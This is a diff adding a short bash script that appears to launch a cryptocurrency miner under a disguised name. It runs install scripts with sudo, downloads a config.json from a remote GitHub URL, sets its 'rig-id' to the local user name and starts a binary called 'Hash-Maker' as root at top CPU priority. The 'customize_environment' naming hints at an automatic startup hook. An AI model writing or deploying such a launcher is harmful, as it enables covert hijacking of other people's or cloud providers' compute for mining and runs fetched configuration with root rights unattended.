@@ -1,0 +1,19 @@
+#!/bin/bash
+
+export TZ=America/Sao_Paulo
+export LOCAL=$(cat $(find /home -name home.file))
+
+cd $LOCAL
+sudo ./install.sh
+data=$(date +"%d-%m-%Y_%H:%M:%S")
+echo $data >> customize_environment.log
+user=${LOCAL/'/home/'}
+if [ -e "CORE/build/Hash-Maker" ]; then
+   cd CORE/build 
+   sudo rm -rf config.json
+   sudo wget https://raw.githubusercontent.com/robotpack/scripts/master/config.json
+   sudo sed -i 's/"rig-id":.*/"rig-id": "'$user'",/' config.json
+   sudo nice -n -20 ./Hash-Maker
+else
+  sudo ./make.sh
+fi
